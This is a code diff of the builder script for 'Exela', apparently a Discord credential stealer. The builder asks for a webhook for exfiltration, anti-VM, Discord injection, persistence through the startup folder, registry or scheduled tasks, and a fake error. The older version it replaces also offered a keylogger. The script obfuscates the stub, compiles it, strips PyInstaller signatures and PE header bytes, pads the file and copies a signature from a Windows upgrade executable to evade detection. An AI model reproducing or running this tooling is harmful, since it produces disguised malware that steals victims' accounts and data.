@@ -1,30 +1,108 @@
-import os, shutil, sys, time, ctypes
+import os, ctypes, shutil, sys, time
 from pkg_resources import parse_version
 
-
 try:
-    ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | {os.getenv('computername')}")
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Exela Premium | Builder | {os.getenv('computername')}")
 except:pass
+try:
+    os.system("color d & cls")
+except:
+    pass
 
-
-class SubModules:
-    @staticmethod
-    def ChangeExeHeaders(file_path:str) -> None:
+class Build:
+    def __init__(self) -> None:
+        self.webhook = None
+        self.Anti_VM = bool()
+        self.startup = bool()
+        self.StartupMethod = None
+        self.injection = bool()
+        self.fakeError = bool()
+        self.current_path = os.getcwd()
+        self.pump = bool()
+        self.pumSize = int() #mb
+        self.pyinstaller = "pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir upx-4.1.0-win64 --version-file version.txt"
+    def CallFuncions(self) -> None:
         try:
-            if os.path.exists(file_path):
-                os.system("cls")
-                print("Removing EXE Metada")
-                time.sleep(1)
-                SubModules().RemoveMetaData(file_path)
-            else:print("err")
+            self.InstallModules()
+            os.system("cls")
+            self.GetWebhook()
+            os.system("cls")
+            self.GetAntiVm()
+            os.system("cls")
+            self.GetDiscordInjection()
+            os.system("cls")
+            self.GetStartupMethod()
+            os.system("cls")
+            self.GetFakeError()
+            os.system("cls")
+            self.GetIcon()
+            os.system("cls")
+            self.PumpFile()
+            os.system("cls")
+            self.WriteSettings()
+            os.system("cls")
+            self.ObfuscateFile("Stub.py")
+            self.build_file()
+            os.system("cls")
+            
+            os.system("cls")
+            self.ChangeMetaData("dist\\Stub.exe")
+            if self.pump == True:
+                self.expand_file("dist\\Stub.exe", self.pumSize)
+            self.SignFile()
+            
+            try:
+                os.remove("Stub.py")
+                os.remove("Stub.spec")
+                shutil.rmtree("dist")
+                shutil.rmtree("build")
+            except:pass
+            print("\n\nfile compiled, close the window")
         except Exception as e:
-            print(f"Error for exe headers : {str(e)}")
-    @staticmethod
-    def RemoveMetaData(file_path:str) -> None:
-        try:
-            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Removigin Metadata") 
-        except:pass
-        with open(file_path, "rb") as file:
+            ctypes.windll.user32.MessageBoxW(0, f"An error occurred while building your file. error code\n\n{str(e)}", "Error",  0x10)
+        else:
+            ctypes.windll.user32.MessageBoxW(0, "Your file compiled succesfully, now u can close the window.", "Information", 0x40)
+            while True:
+                continue
+    def PumpFile(self) -> None:
+        pump_q = str(input("Yes/No (Default size 10 or 11 mb)\nDo u want to pump the file : "))
+        if pump_q.lower() == "y" or pump_q.lower() == "yes":
+            pump_size = int(input("how much mb size u want to pumps : "))
+            if pump_size > 100:
+                print("max 100 mb")
+            else:
+                self.pump = True
+                self.pumSize = pump_size
+        else:self.pump = False
+    def expand_file(self,file_name, additional_size_mb) -> None:
+        additional_size_bytes = additional_size_mb * 1024 * 1024
+
+        with open(file_name, 'ab') as file:
+            current_size = file.tell()
+            target_size = current_size + additional_size_bytes
+
+            empty_bytes = bytearray([0x00] * additional_size_bytes)
+            file.write(empty_bytes)
+
+            print(f"{additional_size_mb} MB added to {file_name}")
+    def ChangeMetaData(self, path:str) -> None:
+        if os.path.isfile(path):
+            print("Removing EXE Metada")
+            time.sleep(1)
+            self.RemoveMetaData(path)
+
+    def RenameEntryPoint(self, path:str, entryPoint:str) -> None:
+        with open(path, "rb") as file:
+            data = file.read()
+
+        entryPoint = entryPoint.encode()
+        new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
+        data = data.replace(entryPoint, new_entryPoint)
+
+        with open(path, "wb") as file:
+            file.write(data)
+    def RemoveMetaData(self, path:str) ->None:
+        with open(path, "rb") as file:
             data = file.read()
         data = data.replace(b"PyInstaller:", b"PyInstallem:")
         data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
@@ -35,152 +113,46 @@ class SubModules:
         start_index = data.find(b"PE\x00\x00") + 8
         end_index = start_index + 4
         data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
-        with open(file_path, "wb") as file:
+        with open(path, "wb") as file:
             file.write(data)
-            del data # remove variable from memory
-    @staticmethod
-    def PumpFile(filePath:str, pump_size:int) -> None: # adding empty byte to file
-        try:
-            try:
-                ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Pumping Stub") 
-            except:pass
-            if os.path.exists(filePath):
-                additional_size_bytes = pump_size * 1024 * 1024
-
-                with open(filePath, 'ab') as file:
-                    current_size = file.tell()
-                    target_size = current_size + additional_size_bytes
-
-                    empty_bytes = bytearray([0x00] * additional_size_bytes)
-                    file.write(empty_bytes)
-
-                    print(f"{pump_size} MB added to {filePath}")
-        except Exception as e:
-            print(f"Error for pumping : {str(e)}")
-    @staticmethod
-    def ObfuscateFile(input_file:str) -> None: # obfuscating the source code
-        os.system("cls")
-        obf_file_path = os.path.join(os.getcwd(), "Obfuscator", "obf.py")
-        run_code = f'python "{obf_file_path}" --junk "{input_file}"'
-        os.system(run_code)
-        time.sleep(1)
-    @staticmethod
-    def AddDigitalSignature(signed_file:str, input_file:str, output_file:str) -> None:
-        run_code = f'python digital-sign.py -i "{signed_file}" -t "{input_file}" -o "{output_file}"'
-        os.system(run_code)
-    @staticmethod
-    def ClearFiles() -> None:
-        try:
-            shutil.rmtree("build")
-            shutil.rmtree("dist")
-            os.remove("stub.py")
-            os.remove("stub.spec")
-        except:pass
-
-class Builder:
-    def __init__(self) -> None:
-        self.VersionFile = os.path.join(os.getcwd() ,"AssemblySettings", "version.txt") # version file path
-        self.PyInstallerCommand = f'pyinstaller --onefile --noconsole --clean --upx-dir upx-4.0.2-win64 --version-file "{self.VersionFile}" '
-        self.Webhook = None
-        self.IconPath = "NONE"
-        self.PumpSize = int() # mb value
-        self.UsePumper = bool()
-        self.UseDiscordInejction = bool()
-        self.UseKeylogger = bool()
-        self.UseFakerError = bool()
-        self.UseAntiVM = bool()
-        self.StartpMethod = "no-startup" # default disabled
+            del data
+    def build_file(self) -> None:
+        os.system(self.pyinstaller)
     def InstallModules(self) -> None:
-        try:
-            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Installing Modules") 
-        except:pass
-        try:
-            os.system('cls')
-            os.system('pip install pynput')
-            os.system("pip install cryptography")
-            os.system("pip install psutil")
-            os.system("pip install wmi")
-            os.system("pip install dhooks")
-            os.system("pip install requests")
-            os.system("pip install pyinstaller")
-            os.system("cls")
-        except:pass
-    def GetUserReqs(self) -> None:
-        try:
-            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Getting Variables") 
-        except:pass
-        self.GetPump()
-        self.GetIcon()
-        antivm = str(input("Do u want to enabled Anti-VM : "))
-        if antivm.lower() == "y" or antivm.lower() == "yes":
-            self.UseAntiVM = True
-        self.GetInjection()
-        self.GetKeylogger()
-        self.GetStartupMethod()
-        self.GetFakeError()
-        time.sleep(0.5)
-    def MakeExe(self) -> None:
-        
-        self.WriteSettings()
-        SubModules().ObfuscateFile("stub.py")
-        try:
-            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Building ...") 
-        except:pass
-        pyinstaller_code = f'{self.PyInstallerCommand} --icon={self.IconPath} stub.py'
-        os.system(pyinstaller_code)
-        SubModules().ChangeExeHeaders(os.path.join("dist", "stub.exe")) 
-        if self.UsePumper:
-            SubModules().PumpFile(os.path.join("dist", "stub.exe"), self.PumpSize)
-        SubModules().AddDigitalSignature(os.path.join("Signed", "Windows10Upgrade9252.exe"), os.path.join("dist", "stub.exe"), "Exela.exe")
-        SubModules().ClearFiles()
-
+        os.system("pip install cryptography")
+        os.system("pip install aiohttp")
+        os.system("pip install pyinstaller")
     def WriteSettings(self) -> None:
-        self.GetUserWebhook()
-        self.GetUserReqs()
-        with open("Exela.py", "r",encoding="utf-8", errors="ignore") as file:
+        with open("Exela.py", "r", encoding="utf-8", errors="ignore") as file:
             data = file.read()
-        
-        replaced_data = data.replace("%WEBHOOK_URL%", str(self.Webhook)).replace("'%AnTiVm%'", str(self.UseAntiVM)).replace("'%StartupMethod%'", str(self.StartpMethod)).replace("'%Keylogger%'", str(self.UseKeylogger)).replace("'%Injection%'", str(self.UseDiscordInejction)).replace('"%fake_error%"', str(self.UseFakerError))                                                                
-
-        with open("stub.py", "w", encoding="utf-8", errors="ignore") as file:
-            file.write(replaced_data)
-    def GetPump(self) -> None:
-        get_req = str(input("Do u want pump the file : "))
-        if get_req.lower() == "y" or get_req.lower() == "yes":
-            try:
-                get_size = int(input("How much mb u want to add : "))
-            except: get_size = 1 # if the user troll the question add 1 mb
-            self.UsePumper = True
-            self.PumpSize = get_size
-    def GetUserWebhook(self) -> None:
-        hook = str(input("Enter Your Discord Webhook URL : "))
-        if hook == "":
-            print("Write Your webhook URL!!!")
-            os._exit(0)
-        elif not hook.startswith("https://discord.com/api/webhooks/"):
-            print(hook)
-            print("Write a Correct Webhook URL")
-            os._exit(0)
-        else:self.Webhook = hook.replace("discordapp", "discord")
+        replaced_data = data.replace("%WEBHOOK%", str(self.webhook)).replace('"%Anti_VM%"', str(self.Anti_VM)).replace('"%injection%"', str(self.injection)).replace("%startup_method%", str(self.StartupMethod)).replace('"%fake_error%"', str(self.fakeError))
+        with open("Stub.py", "w", encoding="utf-8", errors="ignore") as laquica:
+            laquica.write(replaced_data)
+    def SignFile(self) -> None:
+        signed_file = os.path.join(self.current_path, "Signed", "Windows10Upgrade9252.exe")
+        os.system(f'python digital-sign.py -i "{signed_file}" -t "{os.path.join(self.current_path, "dist", "Stub.exe")}" -o Exela.exe')
+    def ObfuscateFile(self, input_file) -> None:
+        obf_file = os.path.join(self.current_path, "Obfuscator", "obf.py")
+        os.system(f'python "{obf_file}" --junk "{input_file}"')
     def GetIcon(self) -> None:
-        try:
-            use_icon = str(input("Do u want to change the icon of the output file : "))
-            if use_icon.lower() == "y" or use_icon.lower() == "yes":
-                get_icon_path = str(input("icon file must be .ico otherwise the icon will not change\nEnter or Drag and Drop your icon here : "))
-                if get_icon_path:
-                    if not os.path.isfile(get_icon_path.replace('"', "")):
-                        print("The file does not exist, icon change has been disabled")
-                        self.IconPath = "NONE"
-                    else:
-                        if not self.CheckIcoFile(get_icon_path.replace('"', "")):
-                            print("The file is not a correct icon file, icon change has been disabled")    
-                            self.IconPath = "NONE"
-                        else:
-                            self.IconPath = get_icon_path
+        get_icon = str(input("Yes/No\nDo u want to change the icon of the file : "))
+        if get_icon.lower() == "yes" or get_icon.lower() == "y":
+            get_icon_path = str(input("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
+            if not get_icon_path.endswith(".ico"):
+                print("pls use .ico file, now icon change has been disabled")
+                self.pyinstaller += "--icon=NONE stub.py"
+            else:
+                if not os.path.isfile(get_icon_path):
+                    print("file does not exist, icon change has been disabled.")
+                    self.pyinstaller += "--icon=NONE stub.py"
                 else:
-                    print("Icon cannot null or empty, now icon change has been disabled")
-                    self.IconPath = "NONE"
-        except:self.IconPath = "NONE"
+                    if self.CheckIcoFile(get_icon_path):
+                        self.pyinstaller += f" --icon={get_icon_path} Stub.py"
+                    else:
+                        print("Your file doesnt current a ico file, icon change has been disabled")
+                        self.pyinstaller += "--icon=NONE stub.py"
+        else:
+            self.pyinstaller += " --icon=NONE Stub.py"
     def CheckIcoFile(self, file_path:str) -> bool:
         try:
             ico_header = b'\x00\x00\x01\x00' # ico header
@@ -191,55 +163,67 @@ class Builder:
             return header_data == ico_header
         except:
             return False
-    def GetInjection(self) -> None:
-        injection = str(input("Do u want to enabled Discord injection : "))
-        if injection.lower() == "y" or injection.lower() == "yes":
-            self.UseDiscordInejction = True
-    def GetKeylogger(self) -> None:
-        keylogger = str(input("Do u want to inject a keylogger after stealing process : "))
-        if keylogger.lower() == "y" or keylogger.lower() == "yes":
-            self.UseKeylogger = True
-    def GetStartupMethod(self) -> None:
-        startupReq = str(input("Do u want to use Startup : "))
-        if startupReq.lower() == "y" or startupReq.lower() == "yes":
-            print("--------------------------------------------\n1-) HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n2-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in and restart every 1 hour\n--------------------------------------------\n\n")
-            getMethod = str(input("1/2 Enter your selection: "))
-            if getMethod == "1":
-                self.StartpMethod = "regedit"
-            elif getMethod == "2":
-                self.StartpMethod = "schtasks"
-            else:
-                print("Invalid choice, now startup has been disabled")
-                self.StartpMethod = "no-startup"
     def GetFakeError(self) -> None:
-        fakeError = str(input("Do u want to use Fake Error : "))
-        if fakeError.lower() == "y" or fakeError.lower() == "yes":
-            self.UseFakerError = True
+        try:
+            er = str(input("Yes/No\nDo u want to use fake Error : "))
+            if er.lower() == "yes" or er.lower() == "y":
+                self.fakeError = True
+            else:self.fakeError = False
+        except:
+            pass
+    def GetWebhook(self) -> None:
+        web = str(input("Enter your webhook URL : "))
+        if not "/api/webhooks/" in web:
+            print("invalid webhook URL")
+            os._exit(0)
+        if not web.startswith("https://"):
+            print("use with https URL not http")
+            os._exit(0)
+        else:
+             self.webhook=web
+    def GetAntiVm(self) -> None:
+        getAntiVmReq = str(input("Yes/No\nDo u want enable Anti-VM : "))
+        if getAntiVmReq.lower() == "y" or getAntiVmReq.lower() == "yes":
+            self.Anti_VM = True
+        else:self.Anti_VM = False
+    def GetStartupMethod(self) -> None:
+        getStartupReq = str(input('Yes/no\nDo you want to use Startup : '))
+        if getStartupReq.lower() == "y" or getStartupReq.lower() == "yes":
+            self.startup = True
+            print("--------------------------------------------\n1-)Folder Startup (This method use windows startup folder's for startup) \n2-)HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n3-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n4-)Disable Startup\n--------------------------------------------\n\n")
+            getStartupMethod = input("1/2/3/4\nEnter your selection: ")
+            if getStartupMethod == "1":
+                self.StartupMethod = "folder"
+            elif getStartupMethod == "2":
+                self.StartupMethod = "regedit"
+            elif getStartupMethod == "3":
+                self.StartupMethod = "schtasks"
+            elif getStartupMethod == "4":
+                self.StartupMethod == "no-startup"
+            else:
+                print("unkown Startup method, startup has been disabled.")
+                self.startup =False
+                self.StartupMethod = "no-startup"
+        else:
+            self.startup = False   
+            self.StartupMethod == "no-startup"
+    def GetDiscordInjection(self) -> None:
+        inj = str(input("Yes/No\nDo u want to enabled Discord injection : "))  
+        if inj.lower() == "y" or inj.lower() == "yes":
+            self.injection == True
+        else:self.injection=False
+
 
 if __name__ == '__main__':
-    
-    if os.name == "nt":
+    if os.name == 'nt':
         version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
-        if (parse_version(version) < parse_version("3.10.0")):
-            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls upgrade 3.10.0 or 3.11.0", "Error",  0x10)
+        if (parse_version(version) < parse_version("3.11.0")):
+            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls upgrade 3.11.0", "Error",  0x10)
         elif (parse_version(version) > parse_version("3.11.0")):
-            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls downgrade 3.10.0 or 3.11.0", "Error",  0x10)
-        elif (parse_version(version) == parse_version("3.10.0")) or parse_version(version) == parse_version("3.11.0"):
-            try:
-                Builder().InstallModules()
-                Builder().MakeExe()
-            except Exception as error:
-                ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | File cannot Compiled!") 
-                ctypes.windll.user32.MessageBoxW(0, f"An error occurred while Building your file\n\nError : {str(error)}", "Error",  0x10)
-                
-            else:
-                ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | File Compiled!")
-                ctypes.windll.user32.MessageBoxW(0, "Your File compiled succesfully, now u can close the window", "Information",  0x40)
-                while True:
-                    continue
-                
+            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls downgrade 3.11.0", "Error",  0x10)
+        elif (parse_version(version) == parse_version("3.11.0")):
+            Build().CallFuncions()
         else:
-            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls use 3.10.0 or 3.11.0", "Error",  0x10)
+            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls use 3.11.0", "Error",  0x10)
     else:
-        print("Just windows os supported by Exela")
-        os._exit(0)
+        print("just windows operating systems supported!")
